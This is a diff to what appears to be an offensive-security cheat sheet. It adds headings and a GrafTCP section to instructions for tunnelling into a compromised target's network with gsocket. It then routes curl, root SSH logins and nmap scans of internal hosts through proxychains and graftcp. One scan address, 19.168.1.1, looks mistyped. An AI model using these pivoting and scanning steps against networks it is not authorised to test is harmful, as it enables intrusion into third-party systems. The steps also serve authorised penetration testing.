@@ -547,6 +547,7 @@ More: [https://github.com/twelvesec/port-forwarding](https://github.com/twelvese
 <a id="scan-proxy"></a>
 **3.iv. Use any tool via Socks Proxy**
 
+### Create a tunnel from the target to your workstation using gsocket:
 On the target's network:
 ```sh
 ## Create a SOCKS proxy into the target's network.
@@ -560,6 +561,7 @@ On your workstation:
 gs-netcat -p 1080
 ```
 
+### Using ProxyChain:
 ```sh
 ## Use ProxyChain to access any host on the target's network: 
 echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" >pc.conf
@@ -568,6 +570,15 @@ proxychains -f pc.conf -q curl ipinfo.io
 proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.1
 ## Start 10 nmaps in parallel:
 seq 1 254 | xargs -P10 -I{} proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.{} 
+```
+
+### Using GrafTCP:
+```sh
+## Use graftcp to access any host on the target's network:
+(graftcp-local -select_proxy_mode only_socks5 &)
+graftcp curl ipinfo.io
+graftcp ssh root@192.168.1.1
+graftcp nmap -n -Pn -sV -F --open 19.168.1.1
 ```
 
 <a id="your-ip"></a>
